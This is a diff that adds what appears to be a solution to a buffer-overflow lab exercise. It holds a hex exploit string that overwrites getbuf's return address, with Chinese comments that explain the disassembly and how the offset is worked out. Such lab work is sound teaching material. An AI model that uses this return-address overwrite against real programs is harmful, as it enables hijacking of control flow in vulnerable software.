@@ -1,0 +1,19 @@
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08 /* 修改的getbuf的缓冲地址 */
+/* 
+Dump of assembler code for function getbuf:
+   0x080491f4 <+0>:     push   %ebp
+   0x080491f5 <+1>:     mov    %esp,%ebp
+   0x080491f7 <+3>:     sub    $0x38,%esp
+   0x080491fa <+6>:     lea    -0x28(%ebp),%eax
+   0x080491fd <+9>:     mov    %eax,(%esp)
+   0x08049200 <+12>:    call   0x8048cfa <Gets>
+   0x08049205 <+17>:    mov    $0x1,%eax
+   0x0804920a <+22>:    leave
+   0x0804920b <+23>:    ret
+End of assembler dump.
+
+其中数组将存放在 -0x28(%ebp)的位置
+mov    %eax,(%esp)这步汇编的目的是gets传入参数，指明读入的地址
+修改getbuf的返回地址即可
+故实际返回地址是0x28+ebp(4)+返回地址(4)=48
+*/
